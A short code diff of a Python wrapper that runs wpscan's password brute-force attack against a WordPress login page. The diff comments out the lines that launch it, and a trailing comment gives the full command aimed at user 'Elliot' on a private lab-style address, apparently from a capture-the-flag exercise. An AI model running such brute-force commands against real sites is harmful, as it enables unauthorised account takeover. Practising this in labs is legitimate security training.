@@ -11,6 +11,6 @@ class WPSCAN:
         subprocess.run(['wpscan', '-U', username, '-P', wordlist, '--password-attack', 'wp-login', '--random-user-agent', '--url', self.target, '--max-threads', threads])
 
 
-a = WPSCAN()
-a.wp_bruteForce()
+# a = WPSCAN()
+# a.wp_bruteForce()
 # wpscan --max-threads 60 -U Elliot -P fsortded.dic --password-attack wp-login   http://10.10.8.12
